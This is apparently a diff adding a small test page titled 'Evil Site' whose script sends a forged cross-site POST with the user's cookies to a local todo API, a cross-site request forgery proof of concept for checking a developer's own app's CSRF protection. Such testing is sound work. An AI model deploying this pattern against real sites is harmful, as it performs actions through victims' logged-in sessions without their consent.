@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Evil Site</title>
+</head>
+<body>
+    <h1>This is an evil site trying to add a todo!</h1>
+    
+    <script>
+        // Try to add a todo without CSRF token
+        fetch('http://localhost:5003/api/todos', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                task: 'HACKED! This todo was added by an evil site'
+            }),
+            credentials: 'include' // Include cookies (JWT will be sent)
+        })
+        .then(response => response.json())
+        .then(data => {
+            document.body.innerHTML += `<p>Response: ${JSON.stringify(data)}</p>`;
+        })
+        .catch(error => {
+            document.body.innerHTML += `<p>Error: ${error.message}</p>`;
+        });
+    </script>
+</body>
+</html>
